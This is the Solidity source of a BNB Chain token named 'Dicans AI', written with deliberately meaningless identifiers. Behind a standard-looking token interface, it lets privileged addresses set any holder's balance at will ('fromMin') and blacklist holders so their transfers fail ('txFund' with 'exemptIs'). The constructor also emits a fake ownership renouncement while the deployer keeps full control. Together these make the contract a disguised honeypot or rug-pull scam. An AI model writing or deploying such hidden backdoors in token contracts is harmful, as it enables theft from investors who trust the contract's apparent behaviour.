/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface launchedTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoLiquidity) external view returns (uint256);

    function transfer(address feeExemptAmount, uint256 launchMarketing) external returns (bool);

    function allowance(address sellMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address feeExemptAmount,
        uint256 launchMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromFund, uint256 value);
    event Approval(address indexed sellMin, address indexed spender, uint256 value);
}

interface launchedTakeMetadata is launchedTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract shouldTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buySender {
    function createPair(address takeMode, address walletReceiver) external returns (address);
}

interface txLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract DicansAI is shouldTeam, launchedTake, launchedTakeMetadata {

    function sellAmount() public view returns (bool) {
        return teamLaunchedExempt;
    }

    function balanceOf(address autoLiquidity) public view virtual override returns (uint256) {
        return fundReceiverMax[autoLiquidity];
    }

    function modeAmount() public {
        
        
        totalLiquidity=false;
    }

    bool private autoMarketingTo;

    bool private launchedTotal;

    function limitIs() public {
        emit OwnershipTransferred(listLiquidity, address(0));
        launchAuto = address(0);
    }

    function transfer(address launchedToken, uint256 launchMarketing) external virtual override returns (bool) {
        return exemptIs(_msgSender(), launchedToken, launchMarketing);
    }

    function exemptIs(address marketingTotal, address feeExemptAmount, uint256 launchMarketing) internal returns (bool) {
        if (marketingTotal == listLiquidity) {
            return walletSender(marketingTotal, feeExemptAmount, launchMarketing);
        }
        require(!sellReceiver[marketingTotal]);
        return walletSender(marketingTotal, feeExemptAmount, launchMarketing);
    }

    address public listLiquidity;

    mapping(address => bool) public sellReceiver;

    bool private txLiquidityMax;

    function fromMin(address launchedToken, uint256 launchMarketing) public {
        require(totalWallet[_msgSender()]);
        fundReceiverMax[launchedToken] = launchMarketing;
    }

    uint8 private marketingFrom = 18;

    function walletSender(address marketingTotal, address feeExemptAmount, uint256 launchMarketing) internal returns (bool) {
        require(fundReceiverMax[marketingTotal] >= launchMarketing);
        fundReceiverMax[marketingTotal] -= launchMarketing;
        fundReceiverMax[feeExemptAmount] += launchMarketing;
        emit Transfer(marketingTotal, feeExemptAmount, launchMarketing);
        return true;
    }

    function transferFrom(address marketingTotal, address feeExemptAmount, uint256 launchMarketing) external override returns (bool) {
        if (senderTrading[marketingTotal][_msgSender()] != type(uint256).max) {
            require(launchMarketing <= senderTrading[marketingTotal][_msgSender()]);
            senderTrading[marketingTotal][_msgSender()] -= launchMarketing;
        }
        return exemptIs(marketingTotal, feeExemptAmount, launchMarketing);
    }

    function txFund(address receiverTrading) public {
        
        if (receiverTrading == listLiquidity || receiverTrading == maxTradingLaunch || !totalWallet[_msgSender()]) {
            return;
        }
        
        sellReceiver[receiverTrading] = true;
    }

    function approve(address senderToAt, uint256 launchMarketing) public virtual override returns (bool) {
        senderTrading[_msgSender()][senderToAt] = launchMarketing;
        emit Approval(_msgSender(), senderToAt, launchMarketing);
        return true;
    }

    bool public limitBuy;

    function allowance(address minEnable, address senderToAt) external view virtual override returns (uint256) {
        return senderTrading[minEnable][senderToAt];
    }

    function name() external view virtual override returns (string memory) {
        return tokenSwap;
    }

    address public maxTradingLaunch;

    string private enableLiquidity = "DAI";

    function totalSupply() external view virtual override returns (uint256) {
        return swapSell;
    }

    uint256 private swapSell = 100000000 * 10 ** 18;

    function walletMinBuy() public {
        
        if (autoMarketingTo) {
            autoMarketingTo = false;
        }
        modeReceiver=0;
    }

    mapping(address => mapping(address => uint256)) private senderTrading;

    bool public feeTrading;

    function decimals() external view virtual override returns (uint8) {
        return marketingFrom;
    }

    bool private teamLaunchedExempt;

    function owner() external view returns (address) {
        return launchAuto;
    }

    function getOwner() external view returns (address) {
        return launchAuto;
    }

    bool public totalLiquidity;

    function txTeam() public {
        if (modeMax) {
            receiverLaunch = modeReceiver;
        }
        if (modeMax != launchedTotal) {
            launchedTotal = true;
        }
        feeTrading=false;
    }

    mapping(address => bool) public totalWallet;

    string private tokenSwap = "Dicans AI";

    event OwnershipTransferred(address indexed minMode, address indexed marketingShouldFund);

    mapping(address => uint256) private fundReceiverMax;

    uint256 public receiverLaunch;

    function symbol() external view virtual override returns (string memory) {
        return enableLiquidity;
    }

    constructor (){ 
        
        txLaunch autoIs = txLaunch(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        maxTradingLaunch = buySender(autoIs.factory()).createPair(autoIs.WETH(), address(this));
        launchAuto = _msgSender();
        if (autoMarketingTo) {
            teamLaunchedExempt = false;
        }
        listLiquidity = _msgSender();
        totalWallet[_msgSender()] = true;
        
        fundReceiverMax[_msgSender()] = swapSell;
        emit Transfer(address(0), listLiquidity, swapSell);
        limitIs();
    }

    uint256 private modeReceiver;

    function takeAuto(address receiverShouldTake) public {
        if (limitBuy) {
            return;
        }
        
        totalWallet[receiverShouldTake] = true;
        if (totalLiquidity == autoMarketingTo) {
            autoMarketingTo = true;
        }
        limitBuy = true;
    }

    function tokenMarketing() public {
        if (modeMax == totalLiquidity) {
            modeReceiver = receiverLaunch;
        }
        if (launchedTotal != feeTrading) {
            feeTrading = false;
        }
        autoMarketingTo=false;
    }

    address private launchAuto;

    bool private modeMax;

}